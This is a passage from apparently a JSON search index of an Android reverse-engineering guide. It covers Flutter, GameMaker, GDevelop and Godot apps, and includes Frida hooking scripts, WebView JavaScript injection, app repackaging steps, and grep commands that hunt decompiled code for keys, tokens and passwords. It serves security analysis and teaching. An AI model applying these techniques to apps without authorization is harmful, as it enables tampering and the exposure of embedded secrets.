Strategy","text":"<p>Flutter hooking targets native function addresses in <code>libapp.so</code>, not Java methods. blutter provides the addresses.</p>"},{"location":"reversing/frameworks/flutter/#using-blutter-generated-frida-stubs","title":"Using blutter-Generated Frida Stubs","text":"<p>blutter outputs <code>blutter_frida.js</code> with pre-generated hooks for discovered functions:</p> <pre><code>var libapp = Module.findBaseAddress(\"libapp.so\");\n\nInterceptor.attach(libapp.add(0x1A2B3C), {\n    onEnter: function(args) {\n        console.log(\"[Dart] LoginService.authenticate called\");\n        console.log(\"  arg0 (this): \" + args[0]);\n    },\n    onLeave: function(retval) {\n        console.log(\"  return: \" + retval);\n    }\n});\n</code></pre> <p>Replace <code>0x1A2B3C</code> with the actual offset from blutter's output for the target function.</p>"},{"location":"reversing/frameworks/flutter/#intercepting-http-requests","title":"Intercepting HTTP Requests","text":"<p>Dart's <code>HttpClient</code> ultimately calls through <code>dart:io</code> functions compiled into <code>libapp.so</code>. Hook the HTTP connection setup:</p> <pre><code>var libapp = Module.findBaseAddress(\"libapp.so\");\n\nvar symbols = blutterOutput.httpClientSymbols;\nsymbols.forEach(function(sym) {\n    Interceptor.attach(libapp.add(sym.offset), {\n        onEnter: function(args) {\n            console.log(\"[HTTP] \" + sym.name + \" called\");\n        }\n    });\n});\n</code></pre>"},{"location":"reversing/frameworks/flutter/#string-pool-monitoring","title":"String Pool Monitoring","text":"<p>Monitor object pool accesses to capture runtime string usage:</p> <pre><code>var libapp = Module.findBaseAddress(\"libapp.so\");\nvar poolBase = libapp.add(0xPOOL_OFFSET);\n\nInterceptor.attach(libapp.add(0xTARGET_FUNC), {\n    onEnter: function(args) {\n        var poolPtr = this.context.x27;\n        console.log(\"[Pool] PP register: \" + poolPtr);\n    }\n});\n</code></pre>"},{"location":"reversing/frameworks/flutter/#obfuscation-anti-analysis","title":"Obfuscation &amp; Anti-Analysis","text":""},{"location":"reversing/frameworks/flutter/#inherent-obfuscation","title":"Inherent Obfuscation","text":"<p>Flutter's AOT compilation provides significant obfuscation by default:</p> Property Effect on RE No DEX code jadx, apktool, smali produce nothing useful Stripped symbols Release builds strip function names from <code>libapp.so</code> Custom snapshot format Standard ELF analysis tools cannot parse the data sections Version-coupled format Snapshot format changes with each Dart SDK version Sequential parsing No random access to classes within the snapshot"},{"location":"reversing/frameworks/flutter/#dart-obfuscation-flag","title":"Dart Obfuscation Flag","text":"<p>Flutter's build system supports the <code>--obfuscate</code> flag combined with <code>--split-debug-info</code>:</p> <pre><code>flutter build apk --obfuscate --split-debug-info=debug_info/\n</code></pre> <p>This replaces Dart class and method names with short random identifiers. blutter will still recover the structure (class hierarchy, method signatures) but not the original names.</p>"},{"location":"reversing/frameworks/flutter/#commercial-protection","title":"Commercial Protection","text":"<ul> <li>Guardsquare DexGuard -- supports Flutter apps, adds native code encryption and integrity checks</li> <li>Promon SHIELD -- runtime application self-protection wrapping Flutter APKs</li> <li>Custom native wrappers -- some apps add an additional native layer that decrypts <code>libapp.so</code> at runtime</li> </ul>"},{"location":"reversing/frameworks/flutter/#anti-debugging","title":"Anti-Debugging","text":"<p>Flutter apps can detect debugging through the Dart <code>assert</code> mechanism (stripped in release) and native anti-debug checks in custom libraries. Standard Frida anti-detection bypasses apply.</p>"},{"location":"reversing/frameworks/flutter/#malware-context","title":"Malware Context","text":"<p>Flutter's AOT compilation has drawn malware authors who want to evade DEX-based scanning without investing in custom packers.</p>"},{"location":"reversing/frameworks/flutter/#fluhorse","title":"FluHorse","text":"<p>FluHorse is the most documented Flutter malware family. First reported by Check Point Research in May 2023, it targets East Asian users (Taiwan, Vietnam) with fake toll collection and banking apps.</p> Aspect Details Business logic Entirely in Dart, compiled to <code>libapp.so</code> Capability Credential theft, credit card harvesting, SMS interception C2 protocol HTTP POST to hardcoded endpoints (e.g., <code>/addcontent3</code>) Evolution Unpacked samples in May 2023, packed samples by June 2023 Analysis reference Fortinet reverse engineering analysis, Virus Bulletin 2024 presentation <p>FluHorse Analysis Approach</p> <p>Run blutter on FluHorse's <code>libapp.so</code> to recover Dart class names. Search the object pool (<code>pp.txt</code>) for HTTP endpoints and credential-related strings. The malware's Dart code is straightforward -- no Dart-level obfuscation was applied in early samples.</p>"},{"location":"reversing/frameworks/flutter/#why-flutter-appeals-to-malware-authors","title":"Why Flutter Appeals to Malware Authors","text":"<ul> <li>Free obfuscation -- jadx and standard scanners produce nothing from <code>libapp.so</code></li> <li>Cross-platform -- single Dart codebase targets Android and iOS</li> <li>Rapid UI cloning -- Flutter's widget system makes it easy to replicate legitimate banking app interfaces for phishing</li> <li>Low DEX footprint -- Android manifest and DEX contain only Flutter bootstrap code, evading signature-based detection focused on Dalvik</li> </ul>"},{"location":"reversing/frameworks/flutter/#re-difficulty-assessment","title":"RE Difficulty Assessment","text":"Aspect Rating Code format Native ARM64 + Dart snapshot (no DEX) Tool maturity Moderate -- blutter is effective but requires exact SDK matching Symbol recovery Good with blutter (class names, method names, pool strings) Control flow Readable after blutter annotation; raw Ghidra analysis is painful String extraction Easy from object pool dump SSL bypass Moderate -- requires reFlutter or native patching (Java hooks useless) Patching Difficult -- requires binary patching of ARM64 code Overall difficulty Hard (rank 24/28) <p>The primary bottleneck is the Dart SDK version matching requirement. If blutter successfully compiles against the target's SDK version, analysis proceeds smoothly with recovered symbols and annotated assembly. Without blutter, the analyst faces a stripped ARM64 binary with custom calling conventions, pool-relative data access, and no standard symbol table -- effectively the same difficulty as any stripped native binary, but with less documentation.</p>"},{"location":"reversing/frameworks/flutter/#references","title":"References","text":"<ul> <li>blutter -- Flutter RE Tool</li> <li>reFlutter -- SSL bypass and snapshot extraction</li> <li>Phrack #71: Reversing Dart AOT snapshots</li> <li>OWASP MASTG: Reverse Engineering Flutter Applications</li> <li>Guardsquare: Current State and Future of Reversing Flutter Apps</li> <li>SensePost: Intercepting HTTPS Communication in Flutter</li> <li>Minded Security: Bypassing Certificate Pinning on Flutter-based Android Apps</li> <li>JEB Dart AOT Snapshot Helper Plugin</li> <li>ping's cookbook: Dart SDK and Snapshots</li> <li>B(l)utter -- HITB 2023 Presentation</li> <li>flutter-versions: SDK to snapshot hash mapping</li> </ul>"},{"location":"reversing/frameworks/gamemaker/","title":"GameMaker","text":"<p>GameMaker compiles game logic written in GML (GameMaker Language) into proprietary bytecode stored in a monolithic data file -- <code>game.droid</code> on Android (equivalent to <code>data.win</code> on Windows). The engine runtime (<code>libyoyo.so</code>) interprets this bytecode at runtime. All game assets -- sprites, audio, room layouts, GML bytecode, and string tables -- are serialized into the single data file. GameMaker offers two compilation modes: VM (bytecode interpreted by the runner) and YYC (YoYo Compiler, which transpiles GML to C++ and compiles to native code). The compilation mode fundamentally changes the reverse engineering approach.</p>"},{"location":"reversing/frameworks/gamemaker/#architecture","title":"Architecture","text":"<p>A GameMaker Android APK contains two or three layers depending on compilation mode:</p>"},{"location":"reversing/frameworks/gamemaker/#vm-mode-bytecode","title":"VM Mode (Bytecode)","text":"Layer Component Contents Java shell <code>com.yoyogames.runner.RunnerActivity</code> Minimal Android activity -- initializes the engine Engine runner <code>libyoyo.so</code> GML bytecode interpreter, rendering, audio, physics, networking (~5-15 MB) Game data <code>assets/game.droid</code> All game content -- GML bytecode, sprites, audio, rooms, strings"},{"location":"reversing/frameworks/gamemaker/#yyc-mode-native-compiled","title":"YYC Mode (Native Compiled)","text":"Layer Component Contents Java shell <code>com.yoyogames.runner.RunnerActivity</code> Same minimal wrapper Compiled game <code>libyoyo.so</code> GML transpiled to C++ and compiled alongside the engine into a single native binary (~20-80 MB) Game data <code>assets/game.droid</code> Asset data only -- sprites, audio, rooms (no bytecode -- code is in libyoyo.so)"},{"location":"reversing/frameworks/gamemaker/#vm-vs-yyc-identification","title":"VM vs YYC Identification","text":"Indicator VM Mode YYC Mode <code>libyoyo.so</code> size ~5-15 MB (runner only) ~20-80 MB (runner + compiled game code) <code>game.droid</code> contents Contains GML bytecode in CODE chunk No CODE chunk -- code compiled natively Performance Interpreted, slower Native, 2-3x faster RE difficulty Moderate -- bytecode decompilable Hard -- native C++ from GML transpilation"},{"location":"reversing/frameworks/gamemaker/#gamedroid-datawin-format","title":"game.droid / data.win Format","text":"<p>The data file uses GameMaker's proprietary IFF-like chunk format. Each chunk has an 8-byte header (4-byte tag + 4-byte size):</p> Chunk Tag Contents <code>FORM</code> Root container chunk <code>GEN8</code> General info -- game name, build version, flags <code>OPTN</code> Game options and settings <code>LANG</code> Language/localization strings <code>EXTN</code> Extensions metadata <code>SOND</code> Sound definitions <code>AGRP</code> Audio group definitions <code>SPRT</code> Sprite definitions -- dimensions, origins, collision masks <code>BGND</code> Background definitions <code>PATH</code> Path definitions <code>SCPT</code> Script name-to-index mappings <code>GLOB</code> Global script indices <code>SHDR</code> Shader source code <code>FONT</code> Font definitions <code>TMLN</code> Timeline definitions <code>OBJT</code> Object definitions -- events, parent objects, physics properties <code>ROOM</code> Room layouts -- instances, tiles, views <code>DAFL</code> Data files <code>TPAG</code> Texture page items -- UV coordinates for sprites on atlases <code>CODE</code> GML bytecode (VM mode only) <code>VARI</code> Variable definitions <code>FUNC</code> Function definitions and references <code>STRG</code> String table -- all string literals <code>TXTR</code> Texture atlas PNG data <code>AUDO</code> Raw audio data"},{"location":"reversing/frameworks/gamemaker/#identification","title":"Identification","text":"Indicator Location <code>assets/game.droid</code> Game data file (primary analysis target) <code>libyoyo.so</code> Engine runner / compiled game in <code>lib/&lt;arch&gt;/</code> <code>com.yoyogames.runner.*</code> Package prefix in DEX and AndroidManifest.xml <code>com.yoyogames.*</code> Alternative package prefix for older versions <code>RunnerActivity</code> Main activity class <pre><code>unzip -l target.apk | grep -E \"(game\\.droid|libyoyo|yoyogames)\"\n</code></pre>"},{"location":"reversing/frameworks/gamemaker/#gamemaker-version-detection","title":"GameMaker Version Detection","text":"<p>The <code>GEN8</code> chunk in <code>game.droid</code> contains the GameMaker build version. Extract it with UndertaleModTool or parse the first bytes after the <code>GEN8</code> chunk header.</p>"},{"location":"reversing/frameworks/gamemaker/#analysis-workflow","title":"Analysis Workflow","text":""},{"location":"reversing/frameworks/gamemaker/#step-1-extract-gamedroid","title":"Step 1: Extract game.droid","text":"<pre><code>unzip target.apk assets/game.droid -d extracted/\n</code></pre>"},{"location":"reversing/frameworks/gamemaker/#step-2-analyze-with-undertalemodtool","title":"Step 2: Analyze with UndertaleModTool","text":"<p>UndertaleModTool (UTMT) is the most complete tool for analyzing GameMaker data files. Despite its name, it works with any GameMaker: Studio game, not just Undertale.</p> <p>UTMT can:</p> <ul> <li>Parse every chunk in the data file</li> <li>Decompile GML bytecode to readable GML source (VM mode)</li> <li>Disassemble GML bytecode to assembly (VM mode)</li> <li>Browse and export all assets (sprites, audio, rooms, strings)</li> <li>Modify and recompile code and assets</li> <li>Search across all scripts and objects</li> </ul> <pre><code>UTMT_CLI extracted/assets/game.droid\n</code></pre> <p>UTMT supports:</p> GameMaker Version Support Level GM:S 1.4 (bytecode 15/16) Full decompilation and recompilation GM:S 2.x Full decompilation, partial recompilation GameMaker 2022+ Partial support, improving"},{"location":"reversing/frameworks/gamemaker/#step-3-gml-code-decompilation","title":"Step 3: GML Code Decompilation","text":"<p>In VM mode, the <code>CODE</code> chunk contains GML bytecode for every script, object event, and timeline moment. UTMT decompiles this to readable GML:</p> <p>The decompiled output preserves:</p> <ul> <li>Function and script names</li> <li>Variable names (both local and global)</li> <li>String literals</li> <li>Control flow (if/else, switch, for, while, repeat)</li> <li>Object event types (Create, Step, Draw, etc.)</li> <li>Built-in function calls (http_request, file_text_open, etc.)</li> </ul> <p>Search decompiled code for security-relevant patterns:</p> <pre><code>grep -rn \"http_\\|url\\|api\\|key\\|secret\\|token\\|password\\|encrypt\\|decrypt\" decompiled_scripts/\n</code></pre>"},{"location":"reversing/frameworks/gamemaker/#step-4-string-table-analysis","title":"Step 4: String Table Analysis","text":"<p>The <code>STRG</code> chunk contains every string literal in the game. Extract and search it for endpoints, keys, and configuration data:</p> <pre><code>strings extracted/assets/game.droid | grep -iE \"(http|api|key|secret|token)\"\n</code></pre>"},{"location":"reversing/frameworks/gamemaker/#step-5-asset-extraction","title":"Step 5: Asset Extraction","text":"<p>UTMT exports sprites, audio, fonts, and room layouts. Sprites are stored as regions on texture atlases (<code>TXTR</code> chunk) -- UTMT handles the UV remapping to export individual sprite frames.</p>"},{"location":"reversing/frameworks/gamemaker/#step-6-yyc-mode-analysis","title":"Step 6: YYC Mode Analysis","text":"<p>If the game was compiled with YYC, the <code>CODE</code> chunk is absent and all GML logic is compiled into <code>libyoyo.so</code> as native C++. Analysis requires Ghidra or IDA:</p> <ol> <li>Load <code>libyoyo.so</code> in Ghidra</li> <li>Search for GML built-in function name strings (they are preserved as lookup keys)</li> <li>Cross-reference string usage to locate game logic functions</li> <li>The transpiled C++ follows predictable patterns from GML source structure</li> </ol> <p>YYC-compiled binaries retain function name strings for GML built-ins (e.g., <code>http_post_string</code>, <code>ds_map_find_value</code>, <code>show_debug_message</code>) because the runner needs them for extension callbacks. These strings serve as anchors for locating game logic in the native binary.</p>"},{"location":"reversing/frameworks/gamemaker/#analysis-tools-summary","title":"Analysis Tools Summary","text":"Tool Purpose URL UndertaleModTool Full data file analysis, GML decompilation, asset extraction, modification Primary tool gamebreaker GameMaker reverse engineering and modding framework Alternative tooling ida_gamemaker IDA Python scripts for GameMaker native binary RE YYC mode analysis Ghidra Native analysis of YYC-compiled libyoyo.so YYC mode analysis Frida Runtime hooking of libyoyo.so functions Dynamic analysis"},{"location":"reversing/frameworks/gamemaker/#hooking","title":"Hooking","text":""},{"location":"reversing/frameworks/gamemaker/#libyoyoso-function-hooking","title":"libyoyo.so Function Hooking","text":"<p>Hook exported functions in <code>libyoyo.so</code> to intercept GML runtime operations:</p> <pre><code>var yoyo = Process.findModuleByName(\"libyoyo.so\");\n\nyoyo.enumerateExports().forEach(function(exp) {\n    if (exp.name.indexOf(\"HTTP\") !== -1 || exp.name.indexOf(\"http\") !== -1) {\n        console.log(\"[GM] \" + exp.name + \" @ \" + exp.address);\n    }\n});\n</code></pre>"},{"location":"reversing/frameworks/gamemaker/#gml-built-in-function-interception","title":"GML Built-in Function Interception","text":"<p>GML built-in functions like <code>http_post_string</code>, <code>http_request</code>, <code>file_text_write_string</code> are resolved by name at runtime. Hook the function lookup mechanism or the built-in functions directly:</p> <pre><code>var yoyo = Process.findModuleByName(\"libyoyo.so\");\n\nvar httpPost = yoyo.enumerateExports().filter(function(e) {\n    return e.name.indexOf(\"http_post_string\") !== -1;\n});\n\nif (httpPost.length &gt; 0) {\n    Interceptor.attach(httpPost[0].address, {\n        onEnter: function(args) {\n            console.log(\"[GM HTTP] http_post_string called\");\n        }\n    });\n}\n</code></pre>"},{"location":"reversing/frameworks/gamemaker/#variable-access-monitoring","title":"Variable Access Monitoring","text":"<p>Hook variable read/write functions to monitor game state changes:</p> <pre><code>var yoyo = Process.findModuleByName(\"libyoyo.so\");\n\nvar varFuncs = yoyo.enumerateExports().filter(function(e) {\n    return e.name.indexOf(\"Variable\") !== -1 &amp;&amp; e.type === \"function\";\n});\n\nvarFuncs.forEach(function(f) {\n    console.log(\"[GM Var] \" + f.name + \" @ \" + f.address);\n});\n</code></pre>"},{"location":"reversing/frameworks/gamemaker/#security-posture","title":"Security Posture","text":"<p>GameMaker's proprietary data format provides moderate protection through obscurity:</p> Factor Effect Proprietary chunk format Not parseable by standard tools -- requires specialized GameMaker-aware tools Binary bytecode GML bytecode is not human-readable without decompilation YYC compilation Transpilation to C++ eliminates bytecode entirely Limited tooling Fewer RE tools compared to Unity or Flutter ecosystems String preservation String literals remain extractable from the STRG chunk regardless of compilation mode Asset bundling All assets in a single file rather than loose files"},{"location":"reversing/frameworks/gamemaker/#weaknesses","title":"Weaknesses","text":"<ul> <li>VM mode bytecode is fully decompilable by UTMT with near-source quality</li> <li>String table contains all literals in plaintext</li> <li>No built-in encryption for game.droid</li> <li>Extension source code (GML) preserved in EXTN chunk metadata</li> <li>No code signing or integrity verification on game.droid by default</li> </ul>"},{"location":"reversing/frameworks/gamemaker/#re-difficulty-assessment","title":"RE Difficulty Assessment","text":"Aspect VM Mode YYC Mode Code format GML bytecode in game.droid Native C++ in libyoyo.so Tool maturity Good -- UTMT handles decompilation well Low -- requires manual native RE Symbol recovery Excellent -- function/variable names preserved Partial -- built-in function name strings preserved Control flow Full recovery via UTMT decompiler Standard native RE difficulty String extraction Trivial -- STRG chunk Trivial -- strings still in binary Hooking Limited -- must hook native runner functions Limited -- same native hooking Overall difficulty Moderate (rank 21/28) Hard (rank 26/28) <p>The primary factor is the compilation mode. VM-mode GameMaker games are straightforward to reverse engineer -- UTMT produces near-source GML output with full variable and function names. YYC-compiled games are significantly harder, requiring native RE skills comparable to any other compiled C++ application, though the predictable transpilation patterns and preserved string table provide useful anchors.</p>"},{"location":"reversing/frameworks/gamemaker/#references","title":"References","text":"<ul> <li>UndertaleModTool (UTMT)</li> <li>gamebreaker -- GameMaker RE Tools</li> <li>ida_gamemaker -- IDA Scripts for GameMaker</li> <li>On GameMaker Game Decompilation -- yal.cc</li> <li>GameMaker Data File Format -- Retro Reversing</li> <li>GameMaker YoYo Compiler Documentation</li> <li>PortMaster: Understanding GameMaker Engine</li> </ul>"},{"location":"reversing/frameworks/gdevelop/","title":"GDevelop","text":"<p>GDevelop is an open-source, no-code/low-code 2D game engine that exports HTML5 games using Pixi.js for rendering. On Android, GDevelop games are wrapped in Apache Cordova (or Capacitor in newer exports), placing the entire game runtime and logic inside <code>assets/www/</code> as plaintext JavaScript. The engine compiles its visual event system into a single monolithic <code>gd.js</code> file -- the primary reverse engineering target.</p>"},{"location":"reversing/frameworks/gdevelop/#architecture","title":"Architecture","text":""},{"location":"reversing/frameworks/gdevelop/#engine-stack","title":"Engine Stack","text":"Layer Component Role Game Logic <code>gd.js</code> Compiled event sheets -- all game behavior in one file Runtime <code>gdjs-evtsext-*.js</code> Extension behaviors (physics, pathfinding, etc.) Rendering <code>pixi.js</code> / <code>pixi-renderers/*.js</code> Pixi.js 2D rendering (WebGL/Canvas) Audio <code>howler.min.js</code> Audio playback via Howler.js Platform Cordova / Capacitor WebView <code>android.webkit.WebView</code> hosting the HTML5 game Android Shell Cordova activity Java bootstrap loading <code>index.html</code>"},{"location":"reversing/frameworks/gdevelop/#compilation-model","title":"Compilation Model","text":"<p>GDevelop's visual event sheets (drag-and-drop logic blocks) compile into JavaScript functions at export time. Each scene's events become a set of functions in <code>gd.js</code>, with a consistent naming pattern:</p> <ul> <li><code>gdjs.&lt;SceneName&gt;Code.func</code> -- main scene event functions</li> <li><code>gdjs.&lt;SceneName&gt;Code.eventsList*</code> -- event handler arrays</li> <li><code>gdjs.RuntimeScene</code> -- base scene management class</li> <li><code>gdjs.RuntimeObject</code> -- base object class</li> </ul> <p>The compiled output is verbose but structured. Variable names and scene/object names from the GDevelop editor are preserved as string identifiers in the generated code, making the logic straightforward to follow.</p>"},{"location":"reversing/frameworks/gdevelop/#identification","title":"Identification","text":"Indicator Location <code>assets/www/gd.js</code> Compiled game logic (primary target) <code>assets/www/pixi-renderers/*.js</code> GDevelop's Pixi.js renderer modules <code>assets/www/libs/pixi.js</code> or <code>assets/www/pixi.min.js</code> Pixi.js rendering library <code>assets/www/howler.min.js</code> Howler.js audio library <code>assets/www/index.html</code> Entry point referencing <code>gd.js</code> <code>assets/www/data.json</code> Game project data (scenes, objects, resources) <code>gdjs.RuntimeScene</code> in JS GDevelop runtime namespace <code>gdjs.evtTools.*</code> in JS GDevelop event tools namespace <p>Quick check:</p> <pre><code>unzip -l target.apk | grep -E \"(gd\\.js|gdjs|pixi-renderers)\"\n</code></pre>"},{"location":"reversing/frameworks/gdevelop/#version-detection","title":"Version Detection","text":"<pre><code>unzip -p target.apk assets/www/gd.js | head -5\n</code></pre> <p>GDevelop exports include a version comment or <code>gdjs.projectData</code> object containing the engine version at the top of <code>gd.js</code>.</p>"},{"location":"reversing/frameworks/gdevelop/#code-location","title":"Code Location","text":""},{"location":"reversing/frameworks/gdevelop/#primary-files","title":"Primary Files","text":"Path Content Size (typical) <code>assets/www/gd.js</code> All compiled game logic, runtime classes, event handlers 500KB -- 5MB+ <code>assets/www/data.json</code> Project metadata, scene definitions, object properties, resource lists 50KB -- 1MB <code>assets/www/gdjs-evtsext-*.js</code> Extension code (physics, tween, pathfinding, etc.) 10KB -- 100KB each <code>assets/www/pixi-renderers/pixi.js</code> Pixi.js rendering (standard, unmodified) ~500KB <code>assets/www/resources/</code> Game assets (images, audio, fonts, JSON data) Varies"},{"location":"reversing/frameworks/gdevelop/#code-structure-in-gdjs","title":"Code Structure in gd.js","text":"<p>The <code>gd.js</code> file contains both the GDevelop runtime engine and the compiled game logic:</p> Section Content <code>gdjs.RuntimeGame</code> Game initialization, scene management, global variables <code>gdjs.RuntimeScene</code> Scene lifecycle, object management, layer system <code>gdjs.RuntimeObject</code> Base object class with position, angle, visibility <code>gdjs.SpriteRuntimeObject</code> Sprite-specific behavior (animations, collision) <code>gdjs.Variable</code> Variable system (game, scene, object scope) <code>gdjs.evtTools</code> Built-in event tools (camera, sound, storage, network) <code>gdjs.&lt;SceneName&gt;Code</code> Per-scene compiled event handlers"},{"location":"reversing/frameworks/gdevelop/#extraction-analysis","title":"Extraction &amp; Analysis","text":""},{"location":"reversing/frameworks/gdevelop/#basic-extraction","title":"Basic Extraction","text":"<pre><code>unzip target.apk \"assets/www/*\" -d extracted/\n</code></pre>"},{"location":"reversing/frameworks/gdevelop/#code-beautification","title":"Code Beautification","text":"<p><code>gd.js</code> is typically minified in production exports:</p> <pre><code>npx prettier --write extracted/assets/www/gd.js\n</code></pre>"},{"location":"reversing/frameworks/gdevelop/#identifying-game-logic","title":"Identifying Game Logic","text":"<p>After beautification, search for scene-specific code:</p> <pre><code>grep -n \"gdjs\\..*Code\\.\" extracted/assets/www/gd.js | head -50\n</code></pre> <p>GDevelop preserves original scene and object names as string literals. Search for game-specific identifiers:</p> <pre><code>grep -n \"getObjects\\|getVariables\\|getLayer\\|createObject\" extracted/assets/www/gd.js | head -30\n</code></pre>"},{"location":"reversing/frameworks/gdevelop/#project-data-analysis","title":"Project Data Analysis","text":"<p>The <code>data.json</code> file contains the full project structure:</p> <pre><code>python3 -c \"import json; d=json.load(open('extracted/assets/www/data.json')); print(json.dumps(d.get('properties',{}), indent=2))\"\n</code></pre> <p>This reveals scene names, global variables, resource file paths, and extension dependencies.</p>"},{"location":"reversing/frameworks/gdevelop/#network-communication","title":"Network Communication","text":"<p>GDevelop's built-in network actions use <code>gdjs.evtTools.network</code>:</p> <pre><code>grep -n \"evtTools\\.network\\|XMLHttpRequest\\|fetch(\\|\\.send(\" extracted/assets/www/gd.js\n</code></pre>"},{"location":"reversing/frameworks/gdevelop/#storage-analysis","title":"Storage Analysis","text":"<p>GDevelop uses <code>gdjs.evtTools.storage</code> for local persistence (backed by <code>localStorage</code>):</p> <pre><code>grep -n \"evtTools\\.storage\\|localStorage\\|writeNumberInJSONFile\\|writeStringInJSONFile\" extracted/assets/www/gd.js\n</code></pre>"},{"location":"reversing/frameworks/gdevelop/#hooking-strategy","title":"Hooking Strategy","text":""},{"location":"reversing/frameworks/gdevelop/#webview-javascript-injection","title":"WebView JavaScript Injection","text":"<p>Inject JavaScript through the Cordova WebView:</p> <pre><code>Java.perform(function() {\n    Java.choose(\"android.webkit.WebView\", {\n        onMatch: function(webview) {\n            webview.evaluateJavascript(\n                \"var _origCreate = gdjs.RuntimeScene.prototype.createObject;\" +\n                \"gdjs.RuntimeScene.prototype.createObject = function(name) {\" +\n                \"  console.log('[GDevelop] Creating object: ' + name);\" +\n                \"  return _origCreate.apply(this, arguments);\" +\n                \"};\",\n                null\n            );\n        },\n        onComplete: function() {}\n    });\n});\n</code></pre>"},{"location":"reversing/frameworks/gdevelop/#variable-monitoring","title":"Variable Monitoring","text":"<pre><code>Java.perform(function() {\n    Java.choose(\"android.webkit.WebView\", {\n        onMatch: function(webview) {\n            webview.evaluateJavascript(\n                \"var _origSetValue = gdjs.Variable.prototype.setNumber;\" +\n                \"gdjs.Variable.prototype.setNumber = function(val) {\" +\n                \"  console.log('[GDevelop] Variable set: ' + val);\" +\n                \"  return _origSetValue.call(this, val);\" +\n                \"};\",\n                null\n            );\n        },\n        onComplete: function() {}\n    });\n});\n</code></pre>"},{"location":"reversing/frameworks/gdevelop/#scene-lifecycle-hooks","title":"Scene Lifecycle Hooks","text":"<pre><code>Java.perform(function() {\n    Java.choose(\"android.webkit.WebView\", {\n        onMatch: function(webview) {\n            webview.evaluateJavascript(\n                \"var _origLoadScene = gdjs.RuntimeGame.prototype._doLoadScene;\" +\n                \"gdjs.RuntimeGame.prototype._doLoadScene = function(name, data) {\" +\n                \"  console.log('[GDevelop] Loading scene: ' + name);\" +\n                \"  return _origLoadScene.apply(this, arguments);\" +\n                \"};\",\n                null\n            );\n        },\n        onComplete: function() {}\n    });\n});\n</code></pre>"},{"location":"reversing/frameworks/gdevelop/#direct-js-modification","title":"Direct JS Modification","text":"<p>As with all Cordova-wrapped games, direct modification is the simplest approach:</p> <ol> <li>Extract <code>assets/www/</code> from APK</li> <li>Edit <code>gd.js</code> or any other file</li> <li>Repackage, re-sign, install</li> </ol>"},{"location":"reversing/frameworks/gdevelop/#obfuscation-protection","title":"Obfuscation &amp; Protection","text":""},{"location":"reversing/frameworks/gdevelop/#default-state","title":"Default State","text":"<p>GDevelop exports produce unobfuscated JavaScript by default. The compiled event code preserves:</p> <ul> <li>Scene names as string literals</li> <li>Object names as string identifiers</li> <li>Variable names in accessor calls</li> <li>Extension and behavior names</li> </ul>"},{"location":"reversing/frameworks/gdevelop/#possible-protections","title":"Possible Protections","text":"Technique Description Bypass JavaScript minification Name mangling via Terser/UglifyJS Beautify -- structure still readable javascript-obfuscator Control flow flattening, string encoding Standard JS deobfuscation tools Cordova plugin protection Native license checks via Cordova plugins Hook Java layer Custom encryption Encrypted <code>data.json</code> or resources Key must be in JS -- trace loading code <p>In practice, GDevelop games rarely employ additional obfuscation beyond the default minification. The target audience (no-code developers) seldom adds custom protection layers.</p>"},{"location":"reversing/frameworks/gdevelop/#re-difficulty-assessment","title":"RE Difficulty Assessment","text":"Aspect Rating Code format Plaintext JavaScript Readability High -- scene/object names preserved String extraction Trivial Control flow recovery Full (standard JS) Patching Trivial -- edit JS directly Data modification Trivial -- JSON project data Obfuscation ceiling Low -- rarely applied Overall difficulty Easy <p>GDevelop games on Android are fully transparent. The compiled event system produces verbose, structured JavaScript that preserves the original scene and object names from the visual editor. Combined with the Cordova wrapper providing no additional protection, analysis requires only a text editor and a JavaScript beautifier.</p>"},{"location":"reversing/frameworks/gdevelop/#references","title":"References","text":"<ul> <li>GDevelop Engine Source</li> <li>GDevelop Runtime (GDJS)</li> <li>Pixi.js -- 2D Rendering Engine</li> <li>Howler.js -- Audio Library</li> <li>Apache Cordova</li> <li>GDevelop Documentation</li> </ul>"},{"location":"reversing/frameworks/godot/","title":"Godot","text":"<p>Godot is an open-source game engine that uses GDScript (a Python-like language) or C# for game logic, with resources packed into <code>.pck</code> archive files. On Android, the engine compiles into <code>libgodot_android.so</code>, and all game assets -- scripts, scenes, textures, audio -- are bundled into a single <code>.pck</code> file stored in <code>assets/</code>. The engine's open-source nature means its internals are fully documented, and its custom scripting VM and resource formats are well understood, making decompilation highly effective when GDScript is used. GDExtension (Godot 4.x) and GDNative (Godot 3.x) allow developers to ship compiled native modules alongside GDScript, which require traditional native reverse engineering.</p>"},{"location":"reversing/frameworks/godot/#architecture","title":"Architecture","text":"<p>A Godot Android APK contains three layers:</p> Layer Component Contents Java shell <code>org.godotengine.godot.Godot</code> Minimal Android activity -- initializes the engine, handles lifecycle Engine binary <code>libgodot_android.so</code> GDScript VM, scene tree, physics, rendering, mbedTLS, audio (~15-30 MB) Game payload <code>assets/*.pck</code> All game resources -- GDScript bytecode, scenes, textures, audio, shaders <p>The Java layer is a thin wrapper. Decompiling it with jadx reveals only engine initialization and permission handling. All meaningful game logic resides in the <code>.pck</code> file as GDScript bytecode or, in C# variants, as .NET assemblies.</p>"},{"location":"reversing/frameworks/godot/#scripting-modes","title":"Scripting Modes","text":"Mode Format RE Difficulty GDScript (VM) <code>.gd</code> source or <code>.gdc</code> bytecode in <code>.pck</code> Low -- fully decompilable with gdsdecomp C# (Mono) .NET DLLs in <code>.pck</code> or <code>assemblies/</code> Low -- decompile with dnSpy/ILSpy like Xamarin GDExtension (Godot 4.x) <code>.so</code> native shared libraries High -- requires Ghidra/IDA GDNative (Godot 3.x) <code>.so</code> native shared libraries High -- requires Ghidra/IDA"},{"location":"reversing/frameworks/godot/#gdscript-bytecode","title":"GDScript Bytecode","text":"<p>GDScript source files (<code>.gd</code>) are compiled to bytecode (<code>.gdc</code>) during export. The bytecode file begins with a 4-byte magic (<code>GDSC</code> for Godot 4.x compiled scripts) followed by a bytecode version number tied to the engine version. The bytecode version changes between Godot releases, so decompilation tools must match the target engine version.</p> <p>In Godot 4.3+, an intermediate representation format (<code>.gdir</code> with magic <code>GDIR</code>) was introduced for GDScript, storing a more structured bytecode that includes type information and optimization hints.</p>"},{"location":"reversing/frameworks/godot/#pck-file-format","title":".pck File Format","text":"<p>The PCK archive is Godot's custom resource package format:</p> Field Description Magic <code>GDPC</code> (4 bytes) Format version Pack format version number Engine version Major.minor.patch of the Godot version used File table Path strings + offsets + sizes + MD5 hashes File data Concatenated resource blobs <p>PCK files can optionally be embedded inside the executable binary (common on desktop, rare on Android). On Android, they are typically standalone files in <code>assets/</code>.</p>"},{"location":"reversing/frameworks/godot/#identification","title":"Identification","text":"Indicator Location <code>assets/*.pck</code> PCK game archive (primary analysis target) <code>libgodot_android.so</code> Engine binary in 